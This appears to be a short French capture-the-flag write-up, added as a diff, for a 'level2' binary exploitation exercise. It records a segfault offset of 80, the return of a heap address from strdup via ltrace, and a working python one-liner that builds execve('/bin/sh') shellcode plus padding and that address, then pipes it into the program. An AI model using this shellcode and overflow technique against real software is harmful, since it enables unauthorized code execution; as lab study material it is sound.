@@ -1,0 +1,16 @@
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+
+grace a notre pattern on peut voir que l offset qui segfault est le 80
+
+a cause du if on ne peut pas utiliser la stack donc on va utiliser la heap. il ni=ous faut une adresse
+
+il ya un strdup qui est inutile avant le return, on compred donc qu on peut utiliser son malloc pour utiliser la heap
+
+avec ltrace ./level2 on trouve l adresse de retour qui est 0x0804a008
+
+on a donc juste besoin de fr notre payload d une taillle de 80 avec notre shel code et l adresse du malloc
+
+
+python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+ "W" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload2
+
+cat /tmp/payload2 - | ./level2
